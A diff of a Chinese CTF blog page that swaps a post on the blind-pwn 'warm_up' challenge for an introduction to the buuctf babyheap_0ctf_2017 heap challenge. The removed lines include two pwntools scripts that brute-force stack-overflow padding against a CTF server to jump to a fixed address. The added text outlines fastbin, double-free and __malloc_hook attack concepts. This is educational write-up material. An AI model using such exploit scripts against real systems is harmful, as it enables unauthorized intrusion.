@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="打卡：盲打题:warm_up, 矢坕个人博客">
+    <meta name="keywords" content="buuctf_babyheap_0ctf_2017, 矢坕个人博客">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>打卡：盲打题:warm_up | 矢坕个人博客</title>
+    <title>buuctf_babyheap_0ctf_2017 | 矢坕个人博客</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -310,12 +310,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/10.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/19.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">打卡：盲打题:warm_up</h1>
+                    <h1 class="description center-align post-title">buuctf_babyheap_0ctf_2017</h1>
                 </div>
             </div>
         </div>
@@ -431,8 +431,8 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/pwn-write-up/">
-                                <span class="chip bg-color">pwn-write-up</span>
+                            <a href="/tags/pwn%E5%8E%9F%E7%90%86%E8%AE%B2%E8%A7%A3-pwn-write-up/">
+                                <span class="chip bg-color">pwn原理讲解 pwn-write-up</span>
                             </a>
                         
                     </div>
@@ -447,21 +447,21 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2023-01-05
+                    2023-01-27
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2023-01-08
+                    2023-01-27
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    268
+                    207
                 </div>
                 
 
@@ -486,37 +486,24 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="盲打题warm-up"><a href="#盲打题warm-up" class="headerlink" title="盲打题warm_up"></a>盲打题warm_up</h2><p>碰到这题的时候以为是题目忘记给附件了，竟然没有题目……后来搜了一下我才知道：我在做一种很新的题目……<br><img src="/images/warm-up/1.png"><br>在碰到这个没附件的题目的时候，就可以做好打盲打的准备了，<strong>很显然第一次碰到，一脸懵逼，故打卡记录</strong><br><img src="/images/warm-up/2.png"><br>看了一下确实是什么反应都没有，输入%p没有任何回应，显然不是格式化字符串漏洞，这时考虑栈溢出。（都盲打了，什么也不知道不至于用什么保护机制来坑人吧）<br>给的0x40060d肯定是返回地址<br>学习下别人写的exp：</p>
-<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
-sys <span class="token operator">=</span> <span class="token number">0x40060d</span>
-
-<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-	<span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>
-	<span class="token keyword">try</span><span class="token punctuation">:</span>
-　　		io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"61.147.171.105"</span><span class="token punctuation">,</span><span class="token number">52590</span><span class="token punctuation">)</span>
-　　		payload <span class="token operator">=</span> <span class="token string">b'A'</span><span class="token operator">*</span>i <span class="token operator">+</span> p64<span class="token punctuation">(</span>sys<span class="token punctuation">)</span>
-　　		io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">">"</span><span class="token punctuation">)</span>
-　　		io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
-　　		<span class="token keyword">print</span><span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
-　　		io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
-	<span class="token keyword">except</span><span class="token punctuation">:</span>
-　　		io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
-或
-<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
-sys <span class="token operator">=</span> <span class="token number">0x40060d</span>
-
-<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-	<span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>
-	<span class="token keyword">try</span><span class="token punctuation">:</span>
-　　		io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"61.147.171.105"</span><span class="token punctuation">,</span><span class="token number">52590</span><span class="token punctuation">)</span>
-　　		payload <span class="token operator">=</span> <span class="token string">b'A'</span><span class="token operator">*</span>i <span class="token operator">+</span> p32<span class="token punctuation">(</span>sys<span class="token punctuation">)</span>
-　　		io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">">"</span><span class="token punctuation">)</span>
-　　		io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
-　　		<span class="token keyword">print</span><span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
-　　		io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
-	<span class="token keyword">except</span><span class="token punctuation">:</span>
-　　		io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>两种代码那去试看看是32位还是64位</p>
+                <h1 id="0x01-buuctf-babyheap-0ctf-2017"><a href="#0x01-buuctf-babyheap-0ctf-2017" class="headerlink" title="0x01 buuctf_babyheap_0ctf_2017"></a>0x01 buuctf_babyheap_0ctf_2017</h1><hr>
+<p>牢骚：第一次做堆题，改exp改了特别长时间，结合别的师傅的wp才做出来的，心累……<br>如果对基础知识不太懂的看看这篇博客，这里不作过多赘述：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43847969/article/details/104897249">知识补充</a></p>
+<hr>
+<p>本题涉及到几个知识点：</p>
+<ul>
+<li>堆溢出</li>
+<li>堆块重叠</li>
+<li>fastbin attack</li>
+<li>double free</li>
+<li>堆泄露libc地址</li>
+<li>pwndbg如何快速找到fake chunk</li>
+<li>__malloc_hook函数的利用<br>环境：Ubuntu16.04</li>
+</ul>
+<hr>
+<h2 id="malloc-hook函数攻击原理："><a href="#malloc-hook函数攻击原理：" class="headerlink" title="__malloc_hook函数攻击原理："></a>__malloc_hook函数攻击原理：</h2><hr>
+<ul>
+<li>像malloc、free、realloc这类函数在执行前会先检查对应的hook函数，如果hook函数为空，则继续执行对应的函数，如果不为空，则跳转到hook中的值对应的地址位置执行。（例如hook函数中如果存的是one_gatget的地址则执行one_gatget）<br>堆题的保护机制一般是全开的，如下：<br><img src="/images/buuctf-babyheap-0ctf-2017/1.png"></li>
+</ul>
 
                 
             </div>
@@ -543,7 +530,7 @@ sys <span class="token operator">=</span> <span class="token number">0x40060d</s
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://airunfive.github.io/2023/01/05/%E6%89%93%E5%8D%A1%EF%BC%9A%E7%9B%B2%E6%89%93%E9%A2%98-warm-up/">http://airunfive.github.io/2023/01/05/%E6%89%93%E5%8D%A1%EF%BC%9A%E7%9B%B2%E6%89%93%E9%A2%98-warm-up/</a>
+                    <a href="http://airunfive.github.io/2023/01/27/buuctf-babyheap-0ctf-2017/">http://airunfive.github.io/2023/01/27/buuctf-babyheap-0ctf-2017/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -581,8 +568,8 @@ sys <span class="token operator">=</span> <span class="token number">0x40060d</s
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/pwn-write-up/">
-                                    <span class="chip bg-color">pwn-write-up</span>
+                                <a href="/tags/pwn%E5%8E%9F%E7%90%86%E8%AE%B2%E8%A7%A3-pwn-write-up/">
+                                    <span class="chip bg-color">pwn原理讲解 pwn-write-up</span>
                                 </a>
                             
                         </div>
@@ -752,17 +739,18 @@ sys <span class="token operator">=</span> <span class="token number">0x40060d</s
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2023/01/06/%E9%AB%98%E7%BA%A7rop-retlibc3%E5%BF%83%E5%BE%97/">
+                <a href="/2023/01/27/buuctf-babyheap-0ctf-2017/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/15.jpg" class="responsive-img" alt="高级rop-retlibc3心得">
+                        <img src="/medias/featureimages/19.jpg" class="responsive-img" alt="buuctf_babyheap_0ctf_2017">
                         
-                        <span class="card-title">高级rop-retlibc3心得</span>
+                        <span class="card-title">buuctf_babyheap_0ctf_2017</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -772,9 +760,9 @@ sys <span class="token operator">=</span> <span class="token number">0x40060d</s
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2023-01-06
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2023-01-27
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
@@ -783,11 +771,12 @@ sys <span class="token operator">=</span> <span class="token number">0x40060d</s
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/pwn-write-up-pwn%E5%8E%9F%E7%90%86%E8%AE%B2%E8%A7%A3/">
-                        <span class="chip bg-color">pwn-write-up pwn原理讲解</span>
+                    <a href="/tags/pwn%E5%8E%9F%E7%90%86%E8%AE%B2%E8%A7%A3-pwn-write-up/">
+                        <span class="chip bg-color">pwn原理讲解 pwn-write-up</span>
                     </a>
                     
                 </div>
@@ -801,13 +790,13 @@ sys <span class="token operator">=</span> <span class="token number">0x40060d</s
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2023/01/05/stack2/">
+                <a href="/2023/01/16/linux%E5%8A%A8%E6%80%81%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/14.jpg" class="responsive-img" alt="stack2">
+                        <img src="/medias/featureimages/13.jpg" class="responsive-img" alt="linux动态内存管理">
                         
-                        <span class="card-title">stack2</span>
+                        <span class="card-title">linux动态内存管理</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -818,7 +807,7 @@ sys <span class="token operator">=</span> <span class="token number">0x40060d</s
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2023-01-05
+                                <i class="far fa-clock fa-fw icon-date"></i>2023-01-16
                             </span>
                         <span class="publish-author">
                             
@@ -831,8 +820,8 @@ sys <span class="token operator">=</span> <span class="token number">0x40060d</s
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/pwn-write-up/">
-                        <span class="chip bg-color">pwn-write-up</span>
+                    <a href="/tags/pwn%E5%8E%9F%E7%90%86%E8%AE%B2%E8%A7%A3/">
+                        <span class="chip bg-color">pwn原理讲解</span>
                     </a>
                     
                 </div>
